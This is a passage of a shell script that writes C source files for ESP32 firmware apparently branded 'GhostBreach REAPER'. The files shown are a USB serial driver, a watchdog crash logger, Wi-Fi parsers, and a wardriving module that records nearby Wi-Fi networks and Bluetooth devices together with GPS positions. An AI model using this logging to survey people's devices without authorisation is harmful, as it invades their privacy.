#include "usb_cdc.h"

static const char *TAG = "usb_cdc";

#define USB_CDC_DEFAULT_VID  0xDEAD
#define USB_CDC_DEFAULT_PID  0xBEEF
#define USB_CDC_NVS_NS       "usb_cdc"
#define USB_CDC_NVS_KEY      "line_coding"
#define USB_CDC_WRITE_TIMEOUT_MS 1000 /* Max ms to wait for host to read */

static uint16_t             g_vid = USB_CDC_DEFAULT_VID;
static uint16_t             g_pid = USB_CDC_DEFAULT_PID;
static char                 g_serial[32] = {0};
static usb_cdc_line_coding_t g_line_coding = {
    .bit_rate   = 115200,
    .data_bits  = 8,
    .parity     = 0,
    .stop_bits  = 1,
};

static SemaphoreHandle_t    g_mutex = NULL;       /* Protects config/state */
static SemaphoreHandle_t    g_write_mutex = NULL; /* Serializes USB TX */

static _Atomic bool         g_dtr_current = false;
static _Atomic bool         g_rts_current = false;
static _Atomic bool         g_break_pending = false;

/*============================================================================*/
static void ensure_serial(void)
{
    if (g_serial[0] != '\0') {
        return;
    }
    uint8_t mac[6] = {0};
    esp_read_mac(mac, ESP_MAC_BASE);
    /* Use full 6-byte MAC for better uniqueness */
    snprintf(g_serial, sizeof(g_serial),
             "%02X%02X%02X%02X%02X%02X",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

/*============================================================================*/
static esp_err_t load_line_coding(void)
{
    nvs_handle_t nvs;
    esp_err_t rc = nvs_open(USB_CDC_NVS_NS, NVS_READONLY, &nvs);
    if (rc == ESP_OK) {
        size_t sz = sizeof(g_line_coding);
        rc = nvs_get_blob(nvs, USB_CDC_NVS_KEY, &g_line_coding, &sz);
        nvs_close(nvs);
        if (rc == ESP_OK) {
            return ESP_OK;
        }
    }
    /* If not found or error, keep defaults. No need to save immediately. */
    return ESP_OK;
}

/*============================================================================*/
static esp_err_t save_line_coding(void)
{
    nvs_handle_t nvs;
    esp_err_t rc = nvs_open(USB_CDC_NVS_NS, NVS_READWRITE, &nvs);
    if (rc != ESP_OK) {
        return rc;
    }
    rc = nvs_set_blob(nvs, USB_CDC_NVS_KEY, &g_line_coding, sizeof(g_line_coding));
    if (rc == ESP_OK) {
        rc = nvs_commit(nvs);
    }
    nvs_close(nvs);
    return rc;
}

/*============================================================================*/
esp_err_t usb_cdc_init(void)
{
    if (g_mutex != NULL) {
        return ESP_ERR_INVALID_STATE;
    }
    
    g_mutex = xSemaphoreCreateMutex();
    g_write_mutex = xSemaphoreCreateMutex();
    
    if (g_mutex == NULL || g_write_mutex == NULL) {
        return ESP_ERR_NO_MEM;
    }
    
    ensure_serial();
    load_line_coding();
    
    ESP_LOGI(TAG, "VID=0x%04X PID=0x%04X serial=%s baud=%u",
             g_vid, g_pid, g_serial, (unsigned)g_line_coding.bit_rate);
    return ESP_OK;
}

/*============================================================================*/
esp_err_t usb_cdc_set_vid_pid(uint16_t vid, uint16_t pid)
{
    if (g_mutex == NULL) return ESP_ERR_INVALID_STATE;
    if (xSemaphoreTake(g_mutex, pdMS_TO_TICKS(100)) != pdTRUE) return ESP_ERR_TIMEOUT;
    
    g_vid = vid;
    g_pid = pid;
    xSemaphoreGive(g_mutex);
    
    ESP_LOGI(TAG, "VID/PID updated 0x%04X:0x%04X", vid, pid);
    return ESP_OK;
}

/*============================================================================*/
esp_err_t usb_cdc_get_vid_pid(uint16_t *out_vid, uint16_t *out_pid)
{
    if (out_vid == NULL || out_pid == NULL) return ESP_ERR_INVALID_ARG;
    if (g_mutex == NULL) return ESP_ERR_INVALID_STATE;
    if (xSemaphoreTake(g_mutex, pdMS_TO_TICKS(100)) != pdTRUE) return ESP_ERR_TIMEOUT;
    
    *out_vid = g_vid;
    *out_pid = g_pid;
    xSemaphoreGive(g_mutex);
    return ESP_OK;
}

/*============================================================================*/
uint32_t usb_cdc_get_vidpid(void)
{
    uint16_t vid, pid;
    if (usb_cdc_get_vid_pid(&vid, &pid) != ESP_OK) {
        return ((uint32_t)USB_CDC_DEFAULT_VID << 16) | USB_CDC_DEFAULT_PID;
    }
    return ((uint32_t)vid << 16) | (uint32_t)pid;
}

/*============================================================================*/
const char *usb_cdc_manufacturer_string(void) { return "GhostBreach"; }
const char *usb_cdc_product_string(void)      { return "REAPER"; }

const char *usb_cdc_serial_string(void)
{
    if (g_mutex == NULL) return "";
    if (xSemaphoreTake(g_mutex, pdMS_TO_TICKS(100)) != pdTRUE) return "";
    const char *s = g_serial;
    xSemaphoreGive(g_mutex);
    return s;
}

/*============================================================================*/
esp_err_t usb_cdc_set_line_coding(const usb_cdc_line_coding_t *coding)
{
    if (coding == NULL || g_mutex == NULL) return ESP_ERR_INVALID_ARG;
    if (xSemaphoreTake(g_mutex, pdMS_TO_TICKS(100)) != pdTRUE) return ESP_ERR_TIMEOUT;
    
    memcpy(&g_line_coding, coding, sizeof(g_line_coding));
    xSemaphoreGive(g_mutex);
    
    save_line_coding();
    ESP_LOGI(TAG, "line coding saved: baud=%u", (unsigned)coding->bit_rate);
    return ESP_OK;
}

/*============================================================================*/
esp_err_t usb_cdc_get_line_coding(usb_cdc_line_coding_t *out)
{
    if (out == NULL || g_mutex == NULL) return ESP_ERR_INVALID_ARG;
    if (xSemaphoreTake(g_mutex, pdMS_TO_TICKS(100)) != pdTRUE) return ESP_ERR_TIMEOUT;
    
    memcpy(out, &g_line_coding, sizeof(g_line_coding));
    xSemaphoreGive(g_mutex);
    return ESP_OK;
}

/*============================================================================*/
esp_err_t usb_cdc_line_coding_to_json(char *buf, size_t bufsz)
{
    if (buf == NULL || bufsz == 0) return ESP_ERR_INVALID_ARG;
    
    usb_cdc_line_coding_t lc;
    esp_err_t rc = usb_cdc_get_line_coding(&lc);
    if (rc != ESP_OK) return rc;
    
    int n = snprintf(buf, bufsz,
        "{\"bit_rate\":%u,\"data_bits\":%u,\"parity\":%u,\"stop_bits\":%u}",
        (unsigned)lc.bit_rate, lc.data_bits, lc.parity, lc.stop_bits);
        
    if (n < 0 || (size_t)n >= bufsz) return ESP_ERR_NO_MEM;
    return ESP_OK;
}

/*============================================================================*/
void usb_cdc_break_signal(void)
{
    atomic_store(&g_break_pending, true);
    ESP_LOGI(TAG, "break signaled (Ctrl-C equivalent)");
}

bool usb_cdc_break_signaled(void)
{
    return atomic_load(&g_break_pending);
}

void usb_cdc_break_clear(void)
{
    atomic_store(&g_break_pending, false);
}

esp_err_t usb_cdc_break_to_json(char *buf, size_t bufsz)
{
    if (buf == NULL || bufsz == 0) return ESP_ERR_INVALID_ARG;
    bool pending = usb_cdc_break_signaled();
    int n = snprintf(buf, bufsz, "{\"break_pending\":%s}", pending ? "true" : "false");
    if (n < 0 || (size_t)n >= bufsz) return ESP_ERR_NO_MEM;
    return ESP_OK;
}

/*============================================================================*/
/*  RX API (Added for completeness)                                           */
/*============================================================================*/
uint32_t usb_cdc_read_available(void)
{
    return tud_cdc_available();
}

uint32_t usb_cdc_read(uint8_t *buf, uint32_t len)
{
    return tud_cdc_read(buf, len);
}

/*============================================================================*/
/*  TX API                                                                    */
/*============================================================================*/
bool usb_cdc_write_available(size_t needed_bytes)
{
    if (!tud_cdc_connected() || !atomic_load(&g_dtr_current)) {
        return false;
    }
    uint32_t avail = tud_cdc_write_available();
    return (avail >= needed_bytes);
}

esp_err_t usb_cdc_write(const uint8_t *buf, size_t len)
{
    if (buf == NULL || len == 0) return ESP_ERR_INVALID_ARG;
    if (g_write_mutex == NULL) return ESP_ERR_INVALID_STATE;

    /* Serialize writes to prevent JSON message interleaving */
    if (xSemaphoreTake(g_write_mutex, pdMS_TO_TICKS(100)) != pdTRUE) {
        return ESP_ERR_TIMEOUT;
    }

    esp_err_t final_err = ESP_OK;
    TickType_t start_tick = xTaskGetTickCount();
    
    while (len > 0) {
        if (atomic_load(&g_break_pending)) {
            atomic_store(&g_break_pending, false);
            final_err = ESP_ERR_CANCEL;
            break;
        }

        /* If host isn't listening, don't block forever */
        if (!tud_cdc_connected() || !atomic_load(&g_dtr_current)) {
            final_err = ESP_ERR_INVALID_STATE;
            break;
        }

        uint32_t avail = tud_cdc_write_available();
        if (avail == 0) {
            if ((xTaskGetTickCount() - start_tick) > pdMS_TO_TICKS(USB_CDC_WRITE_TIMEOUT_MS)) {
                final_err = ESP_ERR_TIMEOUT;
                break;
            }
            vTaskDelay(pdMS_TO_TICKS(1));
            continue;
        }

        uint32_t chunk = (len > avail) ? avail : (uint32_t)len;
        if (chunk > 64) chunk = 64; /* Respect FS USB packet size */

        uint32_t written = tud_cdc_write(buf, chunk);
        if (written == 0) {
            vTaskDelay(pdMS_TO_TICKS(1));
            continue;
        }
        
        buf += written;
        len -= written;
    }

    /* CRITICAL: Flush the TinyUSB buffer to actually send data over USB */
    if (final_err == ESP_OK && tud_cdc_write_available() < CFG_TUD_CDC_TX_BUFSIZE) {
        tud_cdc_write_flush();
    }

    xSemaphoreGive(g_write_mutex);
    return final_err;
}

void usb_cdc_flow_resume(void)
{
    /* Handled automatically by checking DTR/Connected in write loop */
}

size_t usb_cdc_tx_pending(void)
{
    /* Hard to track accurately without hooking TinyUSB TX complete callbacks */
    return 0; 
}

/*============================================================================*/
void usb_cdc_set_dtr_rts(bool dtr, bool rts)
{
    atomic_store(&g_dtr_current, dtr);
    atomic_store(&g_rts_current, rts);
}

/*============================================================================*/
esp_err_t usb_cdc_get_capabilities(usb_cdc_caps_t *out)
{
    if (out == NULL || g_mutex == NULL) return ESP_ERR_INVALID_ARG;
    if (xSemaphoreTake(g_mutex, pdMS_TO_TICKS(100)) != pdTRUE) return ESP_ERR_TIMEOUT;

    memset(out, 0, sizeof(*out));
    out->connected     = tud_cdc_connected();
    out->dtr_active    = atomic_load(&g_dtr_current);
    out->rts_active    = atomic_load(&g_rts_current);
    out->vid           = g_vid;
    out->pid           = g_pid;
    
    strncpy(out->serial, g_serial, sizeof(out->serial) - 1);
    strncpy(out->manufacturer, "GhostBreach", sizeof(out->manufacturer) - 1);
    strncpy(out->product, "REAPER", sizeof(out->product) - 1);
    
    out->tx_avail      = tud_cdc_write_available();
    out->tx_pending    = 0;

    xSemaphoreGive(g_mutex);
    return ESP_OK;
}

/*============================================================================*/
esp_err_t usb_cdc_caps_to_json(char *buf, size_t bufsz)
{
    if (buf == NULL || bufsz == 0) return ESP_ERR_INVALID_ARG;

    usb_cdc_caps_t caps;
    esp_err_t rc = usb_cdc_get_capabilities(&caps);
    if (rc != ESP_OK) return rc;

    int n = snprintf(buf, bufsz,
        "{\"connected\":%s,\"dtr\":%s,\"rts\":%s,"
        "\"vid\":\"0x%04X\",\"pid\":\"0x%04X\","
        "\"serial\":\"%s\",\"manufacturer\":\"%s\",\"product\":\"%s\","
        "\"tx_avail\":%u}",
        caps.connected ? "true" : "false",
        caps.dtr_active ? "true" : "false",
        caps.rts_active ? "true" : "false",
        caps.vid, caps.pid,
        caps.serial, caps.manufacturer, caps.product,
        (unsigned)caps.tx_avail);

    if (n < 0 || (size_t)n >= bufsz) return ESP_ERR_NO_MEM;
    return ESP_OK;
}
EOF_REAPER_FILE
echo "  Updated ${TARGET_DIR}/usb_cdc.c"

cat << 'EOF_REAPER_FILE' > "${TARGET_DIR}/usb_cdc.h"
#ifndef USB_CDC_H
#define USB_CDC_H

#include <stdbool.h>
#include <stdint.h>
#include "esp_err.h"

#ifndef ESP_ERR_CANCEL
#define ESP_ERR_CANCEL 0x10B
#endif

#ifdef __cplusplus
extern "C" {
#endif

typedef struct {
    uint32_t bit_rate;
    uint8_t  data_bits;
    uint8_t  parity;
    uint8_t  stop_bits;
} usb_cdc_line_coding_t;

typedef struct {
    bool     connected;
    bool     dtr_active;
    bool     rts_active;
    uint16_t vid;
    uint16_t pid;
    char     serial[32];
    char     manufacturer[64];
    char     product[64];
    uint32_t tx_avail;
    size_t   tx_pending;
} usb_cdc_caps_t;

esp_err_t usb_cdc_init(void);
esp_err_t usb_cdc_set_vid_pid(uint16_t vid, uint16_t pid);
esp_err_t usb_cdc_get_vid_pid(uint16_t *out_vid, uint16_t *out_pid);
uint32_t usb_cdc_get_vidpid(void);

const char *usb_cdc_manufacturer_string(void);
const char *usb_cdc_product_string(void);
const char *usb_cdc_serial_string(void);

esp_err_t usb_cdc_set_line_coding(const usb_cdc_line_coding_t *coding);
esp_err_t usb_cdc_get_line_coding(usb_cdc_line_coding_t *out);
esp_err_t usb_cdc_line_coding_to_json(char *buf, size_t bufsz);

bool usb_cdc_break_signaled(void);
void usb_cdc_break_clear(void);
esp_err_t usb_cdc_break_to_json(char *buf, size_t bufsz);

/* RX API */
uint32_t usb_cdc_read_available(void);
uint32_t usb_cdc_read(uint8_t *buf, uint32_t len);

/* TX API */
bool usb_cdc_write_available(size_t needed_bytes);
esp_err_t usb_cdc_write(const uint8_t *buf, size_t len);
void usb_cdc_flow_resume(void);
size_t usb_cdc_tx_pending(void);

/* State callbacks (called from TinyUSB callbacks) */
void usb_cdc_set_dtr_rts(bool dtr, bool rts);
void usb_cdc_break_signal(void);

esp_err_t usb_cdc_get_capabilities(usb_cdc_caps_t *out);
esp_err_t usb_cdc_caps_to_json(char *buf, size_t bufsz);

#ifdef __cplusplus
}
#endif

#endif /* USB_CDC_H */
EOF_REAPER_FILE
echo "  Updated ${TARGET_DIR}/usb_cdc.h"

cat << 'EOF_REAPER_FILE' > "${TARGET_DIR}/wardrive.c"
#include "wardrive.h"
#include "gps.h"
#include "storage_sd.h"

#include <stdio.h>
#include <string.h>
#include <inttypes.h>
#include <ctype.h>

#include "esp_log.h"
#include "esp_err.h"
#include "esp_timer.h"

#include "freertos/FreeRTOS.h"
#include "freertos/semphr.h"

static const char *TAG = "wardrive";

#define WARDRIVE_FLUSH_INTERVAL 32

static wardrive_mode_t g_mode = WARDRIVE_MODE_OFF;
static FILE *g_file = NULL;
static SemaphoreHandle_t g_lock = NULL;

static uint32_t g_wifi_points = 0;
static uint32_t g_ble_points = 0;
static uint32_t g_geo_points = 0;
static uint32_t g_no_geo_points = 0;
static uint32_t g_since_flush = 0;
static bool g_first_point = true;

static uint64_t g_start_us = 0;
static char g_path[128] = {0};

static const char *mode_to_str(wardrive_mode_t mode)
{
    switch (mode) {
        case WARDRIVE_MODE_WIFI: return "wifi";
        case WARDRIVE_MODE_BLE:  return "ble";
        case WARDRIVE_MODE_BOTH: return "both";
        default:                 return "off";
    }
}

static void close_file_locked(void)
{
    if (g_file != NULL) {
        fclose(g_file);
        g_file = NULL;
    }
    g_since_flush = 0;
    g_first_point = true;
}

static size_t json_escape_string(char *dst, size_t dst_sz, const char *src)
{
    if (!dst || dst_sz == 0) return 0;
    if (!src) { dst[0] = '\0'; return 0; }

    size_t j = 0;
    for (size_t i = 0; src[i] != '\0' && j + 1 < dst_sz; i++) {
        unsigned char c = (unsigned char)src[i];
        if (c == '"' || c == '\\') {
            if (j + 2 >= dst_sz) break;
            dst[j++] = '\\';
            dst[j++] = (char)c;
        } else if (c < 0x20) {
            dst[j++] = ' ';
        } else {
            dst[j++] = (char)c;
        }
    }
    dst[j] = '\0';
    return j;
}

static bool get_gps_coords(char *lat_str, size_t lat_sz,
                           char *lon_str, size_t lon_sz)
{
    gps_fix_t fix;
    if (gps_get_fix(&fix) == ESP_OK && fix.valid) {
        snprintf(lat_str, lat_sz, "%.6f", fix.latitude);
        snprintf(lon_str, lon_sz, "%.6f", fix.longitude);
        return true;
    }
    return false;
}

esp_err_t wardrive_init(void)
{
    if (g_lock != NULL) {
        return ESP_OK;
    }

    g_lock = xSemaphoreCreateMutex();
    if (g_lock == NULL) {
        return ESP_ERR_NO_MEM;
    }

    g_mode = WARDRIVE_MODE_OFF;
    g_wifi_points = 0;
    g_ble_points = 0;
    g_geo_points = 0;
    g_no_geo_points = 0;
    g_start_us = 0;
    g_since_flush = 0;
    g_first_point = true;
    memset(g_path, 0, sizeof(g_path));

    ESP_LOGI(TAG, "Wardrive module initialized");
    return ESP_OK;
}

esp_err_t wardrive_start(wardrive_mode_t mode)
{
    if (mode == WARDRIVE_MODE_OFF) {
        return wardrive_stop();
    }

    if (g_lock == NULL) {
        esp_err_t rc = wardrive_init();
        if (rc != ESP_OK) return rc;
    }

    if (xSemaphoreTake(g_lock, pdMS_TO_TICKS(1000)) != pdTRUE) {
        return ESP_ERR_TIMEOUT;
    }

    if (g_mode != WARDRIVE_MODE_OFF) {
        xSemaphoreGive(g_lock);
        return ESP_ERR_INVALID_STATE;
    }

    close_file_locked();
    
    g_wifi_points = 0;
    g_ble_points = 0;
    g_geo_points = 0;
    g_no_geo_points = 0;
    g_start_us = esp_timer_get_time();
    g_mode = mode;
    g_first_point = true;

    snprintf(g_path, sizeof(g_path), "/sd/wardrive_%" PRIu64 ".json", g_start_us);

    esp_err_t rc = storage_sd_mount(); 
    if (rc != ESP_OK && rc != ESP_ERR_INVALID_STATE) { 
        ESP_LOGE(TAG, "SD mount failed: %s", esp_err_to_name(rc));
        g_mode = WARDRIVE_MODE_OFF;
        xSemaphoreGive(g_lock);
        return rc;
    }

    g_file = fopen(g_path, "w");
    if (g_file == NULL) {
        ESP_LOGE(TAG, "Failed to open %s", g_path);
        g_mode = WARDRIVE_MODE_OFF;
        xSemaphoreGive(g_lock);
        return ESP_ERR_NO_MEM;
    }

    fprintf(g_file, "{\"mode\":\"%s\",\"start_us\":%" PRIu64 ",\"points\":[\n",
            mode_to_str(mode), g_start_us);
    
    ESP_LOGI(TAG, "Wardrive started: mode=%s path=%s", mode_to_str(mode), g_path);
    xSemaphoreGive(g_lock);
    return ESP_OK;
}

esp_err_t wardrive_stop(void)
{
    if (g_lock == NULL) return ESP_OK;

    if (xSemaphoreTake(g_lock, pdMS_TO_TICKS(1000)) != pdTRUE) {
        return ESP_ERR_TIMEOUT;
    }

    if (g_file != NULL) {
        uint64_t end_us = esp_timer_get_time();
        fprintf(g_file, "\n],\"end_us\":%" PRIu64 "}\n", end_us);
        fflush(g_file);
        close_file_locked();
    }

    wardrive_mode_t prev = g_mode;
    g_mode = WARDRIVE_MODE_OFF;
    
    (void)prev;
    ESP_LOGI(TAG, "Wardrive stopped: mode=%s wifi=%"PRIu32" ble=%"PRIu32" geo=%"PRIu32" no_geo=%"PRIu32,
             mode_to_str(prev), g_wifi_points, g_ble_points, g_geo_points, g_no_geo_points);
             
    xSemaphoreGive(g_lock);
    return ESP_OK;
}

static void flush_if_needed_locked(void)
{
    if (g_file != NULL) {
        g_since_flush++;
        if (g_since_flush >= WARDRIVE_FLUSH_INTERVAL) {
            fflush(g_file);
            g_since_flush = 0;
        }
    }
}

esp_err_t wardrive_log_wifi(const char *bssid, const char *ssid,
                            int8_t rssi, uint8_t channel,
                            const char *security)
{
    if (g_mode != WARDRIVE_MODE_WIFI && g_mode != WARDRIVE_MODE_BOTH) {
        return ESP_OK;
    }
    if (g_lock == NULL) return ESP_ERR_INVALID_STATE;

    if (xSemaphoreTake(g_lock, pdMS_TO_TICKS(100)) != pdTRUE) {
        return ESP_ERR_TIMEOUT;
    }
    if (g_file == NULL) {
        xSemaphoreGive(g_lock);
        return ESP_ERR_INVALID_STATE;
    }

    char lat[32] = "null";
    char lon[32] = "null";
    bool geo = get_gps_coords(lat, sizeof(lat), lon, sizeof(lon));
    
    if (geo) g_geo_points++;
    else g_no_geo_points++;

    g_wifi_points++;

    char safe_ssid[65] = "";
    json_escape_string(safe_ssid, sizeof(safe_ssid), ssid);

    char safe_sec[32] = "";
    json_escape_string(safe_sec, sizeof(safe_sec), security);

    if (!g_first_point) {
        fprintf(g_file, ",\n");
    }
    g_first_point = false;

    fprintf(g_file,
            "{\"t\":\"w\",\"ts\":%" PRIu64 ",\"bssid\":\"%s\",\"ssid\":\"%s\","
            "\"rssi\":%d,\"ch\":%u,\"sec\":\"%s\","
            "\"lat\":%s,\"lon\":%s}",
            (uint64_t)esp_timer_get_time(),
            bssid ? bssid : "00:00:00:00:00:00",
            safe_ssid,
            (int)rssi, (unsigned)channel,
            safe_sec,
            lat, lon);
            
    flush_if_needed_locked();
    xSemaphoreGive(g_lock);
    return ESP_OK;
}

esp_err_t wardrive_log_ble(const uint8_t *addr, const char *name,
                           int8_t rssi, uint8_t channel)
{
    if (g_mode != WARDRIVE_MODE_BLE && g_mode != WARDRIVE_MODE_BOTH) {
        return ESP_OK;
    }
    if (g_lock == NULL) return ESP_ERR_INVALID_STATE;

    if (xSemaphoreTake(g_lock, pdMS_TO_TICKS(100)) != pdTRUE) {
        return ESP_ERR_TIMEOUT;
    }
    if (g_file == NULL) {
        xSemaphoreGive(g_lock);
        return ESP_ERR_INVALID_STATE;
    }

    char lat[32] = "null";
    char lon[32] = "null";
    bool geo = get_gps_coords(lat, sizeof(lat), lon, sizeof(lon));
    
    if (geo) g_geo_points++;
    else g_no_geo_points++;

    g_ble_points++;

    char mac[18];
    if (addr != NULL) {
        snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
                 addr[0], addr[1], addr[2], addr[3], addr[4], addr[5]);
    } else {
        snprintf(mac, sizeof(mac), "00:00:00:00:00:00");
    }

    char safe_name[65] = "";
    json_escape_string(safe_name, sizeof(safe_name), name);

    if (!g_first_point) {
        fprintf(g_file, ",\n");
    }
    g_first_point = false;

    fprintf(g_file,
            "{\"t\":\"b\",\"ts\":%" PRIu64 ",\"mac\":\"%s\",\"name\":\"%s\","
            "\"rssi\":%d,\"ch\":%u,\"lat\":%s,\"lon\":%s}",
            (uint64_t)esp_timer_get_time(),
            mac, safe_name,
            (int)rssi, (unsigned)channel,
            lat, lon);
            
    flush_if_needed_locked();
    xSemaphoreGive(g_lock);
    return ESP_OK;
}

esp_err_t wardrive_get_stats(wardrive_stats_t *out)
{
    if (out == NULL) return ESP_ERR_INVALID_ARG;
    if (g_lock == NULL) return ESP_ERR_INVALID_STATE;

    if (xSemaphoreTake(g_lock, pdMS_TO_TICKS(100)) != pdTRUE) {
        return ESP_ERR_TIMEOUT;
    }
    
    out->wifi_points = g_wifi_points;
    out->ble_points = g_ble_points;
    out->total_points = g_wifi_points + g_ble_points;
    out->start_us = g_start_us;
    out->end_us = (g_mode == WARDRIVE_MODE_OFF) ? esp_timer_get_time() : 0;
    out->geo_points = g_geo_points;
    out->no_geo_points = g_no_geo_points;
    snprintf(out->export_path, sizeof(out->export_path), "%s", g_path);
    
    xSemaphoreGive(g_lock);
    return ESP_OK;
}

esp_err_t wardrive_json(char *buf, size_t bufsz)
{
    if (buf == NULL || bufsz == 0) return ESP_ERR_INVALID_ARG;
    
    wardrive_stats_t st;
    esp_err_t rc = wardrive_get_stats(&st);
    if (rc != ESP_OK) return rc;

    int n = snprintf(buf, bufsz,
                     "{\"mode\":\"%s\",\"wifi\":%"PRIu32",\"ble\":%"PRIu32",\"total\":%"PRIu32","
                     "\"geo\":%"PRIu32",\"no_geo\":%"PRIu32",\"path\":\"%s\"}",
                     mode_to_str(g_mode),
                     st.wifi_points, st.ble_points, st.total_points,
                     st.geo_points, st.no_geo_points,
                     st.export_path);
                     
    return (n < 0 || (size_t)n >= bufsz) ? ESP_ERR_NO_MEM : ESP_OK;
}

wardrive_mode_t wardrive_get_mode(void)
{
    return g_mode;
}

esp_err_t wardrive_deinit(void)
{
    wardrive_stop();
    if (g_lock != NULL) {
        vSemaphoreDelete(g_lock);
        g_lock = NULL;
    }
    return ESP_OK;
}
EOF_REAPER_FILE
echo "  Updated ${TARGET_DIR}/wardrive.c"

cat << 'EOF_REAPER_FILE' > "${TARGET_DIR}/watchdog.c"
/*
 * ============================================================================
 *  watchdog.c  —  Watchdog supervisor and post-mortem crash logging
 * ============================================================================
 */

#include "watchdog.h"
#include "storage_spiffs.h"

#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdatomic.h>
#include <time.h>

#include "esp_system.h"
#include "esp_log.h"
#include "esp_task_wdt.h"
#include "esp_timer.h"

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

static const char *TAG = "watchdog";
static const char *CRASH_PATH = "/spiffs/crash.log";

/* ── Internal Helpers ─────────────────────────────────────────────────── */

static const char* reset_reason_to_str(esp_reset_reason_t reason)
{
    switch (reason) {
        case ESP_RST_POWERON:   return "POWERON";
        case ESP_RST_EXT:       return "EXT";
        case ESP_RST_SW:        return "SW";
        case ESP_RST_PANIC:     return "PANIC";
        case ESP_RST_INT_WDT:   return "INT_WDT";
        case ESP_RST_TASK_WDT:  return "TASK_WDT";
        case ESP_RST_WDT:       return "WDT";
        case ESP_RST_DEEPSLEEP: return "DEEPSLEEP";
        case ESP_RST_BROWNOUT:  return "BROWNOUT";
        case ESP_RST_SDIO:      return "SDIO";
        default:                return "UNKNOWN";
    }
}

static void write_crash_log_to_spiffs(esp_reset_reason_t reason)
{
    if (!storage_spiffs_is_ready()) {
        ESP_LOGW(TAG, "SPIFFS not ready; cannot persist crash log");
        return;
    }

    FILE *f = fopen(CRASH_PATH, "w");
    if (!f) {
        ESP_LOGE(TAG, "Failed to open crash log for writing");
        return;
    }

    time_t now = time(NULL);
    struct tm timeinfo;
    char time_str[32] = "unknown";
    if (localtime_r(&now, &timeinfo) != NULL) {
        strftime(time_str, sizeof(time_str), "%Y-%m-%d %H:%M:%S", &timeinfo);
    }

    fprintf(f, "=== REAPER CRASH LOG ===\n");
    fprintf(f, "Boot Time: %s\n", time_str);
    fprintf(f, "Reset Reason: %s (%d)\n", reset_reason_to_str(reason), (int)reason);
    fprintf(f, "Free Heap at Boot: %u bytes\n", (unsigned)esp_get_free_heap_size());
    fprintf(f, "Min Free Heap: %u bytes\n", (unsigned)esp_get_minimum_free_heap_size());
    fprintf(f, "Uptime (us): %llu\n", (unsigned long long)esp_timer_get_time());
    fprintf(f, "\nNote: Full register state requires a coredump partition.\n");

    fclose(f);
    ESP_LOGW(TAG, "Crash log persisted to %s", CRASH_PATH);
}

/* ── Public API ───────────────────────────────────────────────────────── */

esp_err_t watchdog_init(void)
{
    esp_reset_reason_t reason = esp_reset_reason();

    /* 
     * SAFE CRASH LOGGING:
     * Instead of trying to write to SPIFFS while the system is actively 
     * crashing (which causes hangs/secondary panics), we detect the panic 
     * on the *next boot* and write the log from a safe task context.
     */
    if (reason == ESP_RST_PANIC || 
        reason == ESP_RST_TASK_WDT || 
        reason == ESP_RST_INT_WDT || 
        reason == ESP_RST_WDT) {
        
        ESP_LOGW(TAG, "Detected abnormal reset reason: %s", reset_reason_to_str(reason));
        write_crash_log_to_spiffs(reason);
    }

    ESP_LOGI(TAG, "Watchdog supervisor initialized");
    return ESP_OK;
}

void watchdog_task_refresh(const char *task_name)
{
    (void)task_name; /* Used only for logging if needed */

    TaskHandle_t handle = xTaskGetCurrentTaskHandle();
    if (handle == NULL) return;

    esp_err_t r = esp_task_wdt_reset();
    
    if (r == ESP_ERR_NOT_FOUND) {
        /* Task wasn't subscribed yet; subscribe it now */
        if (esp_task_wdt_add(handle) == ESP_OK) {
            esp_task_wdt_reset();
        }
    }
}

void watchdog_test_panic(void)
{
    ESP_LOGE(TAG, "Initiating test panic via abort()");
    abort();
}

esp_err_t watchdog_read_crash(char *out, size_t out_len)
{
    if (!out || !out_len) return ESP_ERR_INVALID_ARG;
    out[0] = '\0';

    FILE *f = fopen(CRASH_PATH, "r");
    if (!f) {
        snprintf(out, out_len, "No crash log found.");
        return ESP_ERR_NOT_FOUND;
    }

    size_t rd = fread(out, 1, out_len - 1, f);
    out[rd] = '\0';
    fclose(f);
    
    return ESP_OK;
}

void watchdog_clear_crash(void)
{
    if (remove(CRASH_PATH) == 0) {
        ESP_LOGI(TAG, "Crash log cleared");
    } else {
        ESP_LOGD(TAG, "No crash log to clear");
    }
}

bool watchdog_has_crash_log(void)
{
    FILE *f = fopen(CRASH_PATH, "r");
    if (f) {
        fclose(f);
        return true;
    }
    return false;
}
EOF_REAPER_FILE
echo "  Updated ${TARGET_DIR}/watchdog.c"

cat << 'EOF_REAPER_FILE' > "${TARGET_DIR}/wifi_rrm.c"
#include "wifi_rrm.h"
#include <string.h>
#include <stdbool.h>
#include "esp_log.h"


#define IE_NEIGHBOR_REPORT  52
#define IE_MBSSID          55
#define IE_HE_CAPABILITIES 35
#define NBR_MIN_LEN 15
#define IE_COUNTRY 11
#define COUNTRY_MIN_LEN 6 /* cc[2] + env + 1 subband triplet */

static uint8_t wifi_country_extract_tx_power(const uint8_t *data, size_t len)
{
    if (data == NULL || len < COUNTRY_MIN_LEN) return 0;
    size_t pos = 4; /* after country_code[2] + environment */
    while (pos + 3 <= len) {
        uint8_t first_ch = data[pos + 1];
        uint8_t max_tx = data[pos + 3];
        if (pos + 5 <= len) {
            if (first_ch == 0) pos += 5;
            else pos += 4;
        } else {
            break;
        }
        return max_tx;
    }
    return 0;
}

bool wifi_country_parse(const uint8_t *ies, size_t len,
                         char *out_country_code, size_t cc_sz,
                         uint8_t *out_reg_class, uint8_t *out_max_tx_power)
{
    if (ies == NULL || len == 0 || out_country_code == NULL || cc_sz == 0) return false;
    out_country_code[0] = '\0';
    if (out_reg_class) *out_reg_class = 0;
    if (out_max_tx_power) *out_max_tx_power = 0;

    size_t pos = 0;
    while (pos + 2 <= len) {
        uint8_t tag_id = ies[pos];
        uint8_t tag_len = ies[pos + 1];
        if (pos + 2 + tag_len > len) break;

        if (tag_id == IE_COUNTRY && tag_len >= COUNTRY_MIN_LEN - 2) {
            memcpy(out_country_code, &ies[pos + 2], 2);
            out_country_code[2] = '\0';
            if (out_reg_class) *out_reg_class = ies[pos + 4];
            if (out_max_tx_power) *out_max_tx_power = wifi_country_extract_tx_power(&ies[pos + 2], tag_len);
            return true;
        }
        pos += 2 + tag_len;
    }
    return false;
}

bool wifi_rrm_parse_beacon(const uint8_t *ies, size_t len,
                           neighbor_entry_t *out_nbrs, uint8_t *out_nbr_count)
{
    if (ies == NULL || len == 0 || out_nbrs == NULL || out_nbr_count == NULL) return false;
